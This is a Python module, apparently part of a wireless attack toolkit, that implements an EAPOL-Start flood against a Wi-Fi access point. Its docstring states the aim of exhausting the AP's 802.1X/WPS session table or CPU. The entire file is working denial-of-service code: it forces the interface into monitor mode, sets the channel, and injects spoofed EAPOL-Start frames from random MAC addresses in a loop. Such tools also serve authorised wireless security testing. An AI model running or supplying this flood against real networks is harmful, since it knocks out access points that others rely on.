"""EAPOL-Start flood: exhaust an AP's 802.1X/WPS authenticator state.

Every EAPOL-Start a real station sends kicks off a fresh authenticator
session the AP has to allocate and track. A resource-constrained AP
(consumer router firmware, not enterprise RADIUS-backed gear) fielding
many concurrent bogus sessions from distinct source MACs can exhaust its
session table or CPU budget -- a documented 802.1X DoS class, not
specific to any one vendor. Native from-scratch injection using
wps/eap.py's craft_eapol_start(), following attacks/deauth.py's
conventions (monitor-mode self-heal, per-frame stop_event check, one
socket.send() per frame).
"""

from __future__ import annotations

import time

from scapy.config import conf

from ..radio import (
    ensure_channel,
    ensure_monitor_mode,
    get_mode,
    random_locally_administered_mac,
)
from ..wps.eap import craft_eapol_start


def eapol_flood(
    iface: str,
    bssid: str,
    client: str | None = None,
    count: int = 100,
    channel: int | None = None,
    interval: float = 0.0,
    randomize_client: bool = True,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Send count EAPOL-Start frames to bssid.

    randomize_client (default True): use a fresh random locally-
    administered source MAC per frame instead of one fixed `client` --
    an AP that dedupes/rate-limits per-source-MAC session attempts is far
    less affected by repeats from the same address than by many distinct
    ones, matching how real multi-station exhaustion happens. Set False
    (and pass a real `client` MAC) to flood as a single spoofed station
    instead.

    stop_event: checked before every frame; a set event aborts the
    remaining count immediately, same contract as attacks/deauth.py.

    Returns the number of frames actually handed to the OS for
    transmission -- 0 if iface isn't in monitor mode.
    """
    log = progress_fn or (lambda msg: None)

    if not randomize_client and client is None:
        raise ValueError("client is required when randomize_client=False")

    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- EAPOL-Start frames cannot transmit")
        return 0

    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"EAPOL flood socket open failed: {exc}")
        return 0

    sent = 0
    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"EAPOL flood stopped after {sent} frame(s) -- stop requested")
                return sent
            src = random_locally_administered_mac() if randomize_client else client
            assert src is not None  # guaranteed above: randomize_client=False requires client
            pkt = craft_eapol_start(bssid, src)
            try:
                sock.send(pkt)
                sent += 1
            except OSError as exc:
                log(f"EAPOL flood send failed after {sent} frame(s): {exc}")
                return sent
            log(f"EAPOL-Start {i + 1}/{count} sent: {src} -> {bssid}")
            # Unconditional sleep(interval), even at 0.0 -- see
            # auth_flood.py's note: a real syscall forces a GIL yield every
            # frame, which a falsy-guarded skip would not.
            if i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
